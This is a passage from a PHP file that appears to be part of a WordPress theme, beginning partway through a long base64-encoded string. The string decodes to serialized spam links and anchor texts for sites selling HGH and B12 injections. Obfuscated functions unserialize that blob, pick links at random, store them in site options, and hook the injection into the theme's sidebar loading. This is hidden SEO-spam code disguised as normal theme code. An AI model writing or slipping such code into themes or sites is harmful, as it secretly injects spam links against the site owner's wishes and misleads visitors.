LmhjZ2luamVjdGlvbm5ld3MuY29tIjtzOjk6Im1vcmUgaGVyZSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25uZXdzLmNvbSI7czo0OiJoZXJlIjtzOjIyOiJodHRwOi8vd3d3LmIxMnNob3RzLnVzIjtzOjExOiJiMTJzaG90cy51cyI7czoyMjoiaHR0cDovL3d3dy5iMTJzaG90cy51cyI7czoxNToid3d3LmIxMnNob3RzLnVzIjtzOjIyOiJodHRwOi8vd3d3LmIxMnNob3RzLnVzIjtzOjIyOiJodHRwOi8vd3d3LmIxMnNob3RzLnVzIjtzOjIyOiJodHRwOi8vd3d3LmIxMnNob3RzLnVzIjtzOjk6ImIxMiBzaG90cyI7czoyNToiaHR0cDovL3d3dy5iMTJzaG90c3VzLmNvbSI7czoxNDoiYjEyIGluamVjdGlvbnMiO3M6MjU6Imh0dHA6Ly93d3cuYjEyc2hvdHN1cy5jb20iO3M6MTQ6ImZpbmQgYjEyIHNob3RzIjtzOjIyOiJodHRwOi8vd3d3LmIxMnNob3RzLnVzIjtzOjk6InJlYWQgbW9yZSI7czoyMjoiaHR0cDovL3d3dy5iMTJzaG90cy51cyI7czoxNDoiYjEyc2hvdHN1cy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuYjEyc2hvdHN1cy5jb20iO3M6MTg6Ind3dy5iMTJzaG90c3VzLmNvbSI7czoyNToiaHR0cDovL3d3dy5iMTJzaG90c3VzLmNvbSI7czoyNToiaHR0cDovL3d3dy5iMTJzaG90c3VzLmNvbSI7czoyNToiaHR0cDovL3d3dy5iMTJzaG90c3VzLmNvbSI7czoxNzoiYjEyIHZpdGFtaW4gc2hvdHMiO3M6MjU6Imh0dHA6Ly93d3cuYjEyc2hvdHN1cy5jb20iO3M6MTY6Im9ubGluZSBiMTIgc2hvdHMiO3M6MjU6Imh0dHA6Ly93d3cuYjEyc2hvdHN1cy5jb20iO3M6MTg6ImhnaGluamVjdGlvbnN4LmNvbSI7czoyOToiaHR0cDovL3d3dy5oZ2hpbmplY3Rpb25zeC5jb20iO3M6MjI6Ind3dy5oZ2hpbmplY3Rpb25zeC5jb20iO3M6Mjk6Imh0dHA6Ly93d3cuaGdoaW5qZWN0aW9uc3guY29tIjtzOjI5OiJodHRwOi8vd3d3LmhnaGluamVjdGlvbnN4LmNvbSI7czoyOToiaHR0cDovL3d3dy5oZ2hpbmplY3Rpb25zeC5jb20iO3M6MTM6ImhnaCBpbmplY3Rpb24iO3M6Mjk6Imh0dHA6Ly93d3cuaGdoaW5qZWN0aW9uc3guY29tIjtzOjIwOiJoZ2ggaW5qZWN0aW9uIG9ubGluZSI7czoyOToiaHR0cDovL3d3dy5oZ2hpbmplY3Rpb25zeC5jb20iO3M6MTQ6ImhnaCBpbmplY3Rpb25zIjtzOjI5OiJodHRwOi8vd3d3LmhnaGluamVjdGlvbnN4LmNvbSI7czo4OiJoZ2ggZGlldCI7czoyOToiaHR0cDovL3d3dy5oZ2hpbmplY3Rpb25zeC5jb20iO3M6MTY6ImRpZXRpbmcgd2l0aCBoZ2giO3M6Mjk6Imh0dHA6Ly93d3cuaGdoaW5qZWN0aW9uc3guY29tIjtzOjEwOiJoZ2ggc291cmNlIjtzOjI5OiJodHRwOi8vd3d3LmhnaGluamVjdGlvbnN4LmNvbSI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>